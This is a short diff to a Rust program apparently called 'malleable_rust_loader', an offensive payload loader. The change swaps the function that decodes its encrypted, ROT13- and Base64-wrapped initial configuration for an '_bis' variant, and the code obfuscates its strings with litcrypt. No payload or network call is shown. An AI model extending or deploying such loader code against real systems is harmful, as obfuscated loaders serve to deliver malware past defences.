@@ -6,7 +6,7 @@ use std::thread;
 extern crate litcrypt;
 use_litcrypt!();
 
-use malleable_rust_loader::dataoperation::un_apply_all_dataoperations;
+use malleable_rust_loader::dataoperation::un_apply_all_dataoperations_bis;
 use malleable_rust_loader::dataoperation::DataOperation;
 use malleable_rust_loader::payload::Payload;
 use malleable_rust_loader::payload_util::print_running_thread;
@@ -43,12 +43,12 @@ fn main() {
     let loader_conf_encrypted = INITIAL_LOADER.to_vec();
     let data_op_encrypted = INITIAL_LOADER_DATAOPE.to_vec();
     let ope_for_data_op: Vec<DataOperation> = vec![DataOperation::ROT13, DataOperation::BASE64];
-    let decrypted_dataop = un_apply_all_dataoperations(ope_for_data_op, data_op_encrypted).unwrap();
+    let decrypted_dataop = un_apply_all_dataoperations_bis(ope_for_data_op, data_op_encrypted).unwrap();
     let dataoperation: Vec<DataOperation> =
         serde_json::from_slice(decrypted_dataop.as_slice()).unwrap();
     debug!("{}{:?}", lc!("[+] dataoperation: "), dataoperation);
     info!("{}", lc!("[+] DECRYPT initial config"));
-    let decrypted_conf = un_apply_all_dataoperations(dataoperation, loader_conf_encrypted).unwrap();
+    let decrypted_conf = un_apply_all_dataoperations_bis(dataoperation, loader_conf_encrypted).unwrap();
     info!("{}", lc!("[+] DECRYPTED!"));
     let mut config: Config = serde_json::from_slice(decrypted_conf.as_slice()).unwrap();
     info!("{}", lc!("[+] VERIFY initial config"));
